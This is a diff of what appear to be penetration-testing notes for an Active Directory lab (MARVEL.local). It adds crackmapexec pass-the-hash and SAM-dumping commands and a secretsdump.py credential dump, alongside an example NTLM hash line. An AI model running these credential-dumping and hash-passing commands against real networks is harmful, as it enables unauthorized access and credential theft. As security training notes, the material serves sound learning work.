@@ -64,13 +64,21 @@ samdump2 SYSTEM SAM
 Username:1000:aad3b435b51404eeaad3b435b51404ee:<this>26112010952d963c8dc4217daec986d9</this>:::
 ```
 
-### Pass the Password/Hash wtih crackmapexec
+### Pass the Password/Hash with crackmapexec
 ```
 apt install crackmapexec
 
 # Pass the password around the domain to see where it works
 crackmapexec smb 10.0.3.0/24 -u username -d MARVEL.local -p Password1
 
-# Pass the hash
+# Pass the hash. NTLM can be passed, NTLMv2 can not.
 crackmapexec smb 10.0.3.0/24 -u username -H <theHashValue> --local
+
+# Can also dump SAM
+crackmapexec smb 10.0.3.0/24 -u username -d MARVEL.local -p Password1 --sam
+```
+
+#### Dump hashes with secretsdump.py
+```
+secretsdump.py marvel/fcastle:Password1@<ip>
 ```
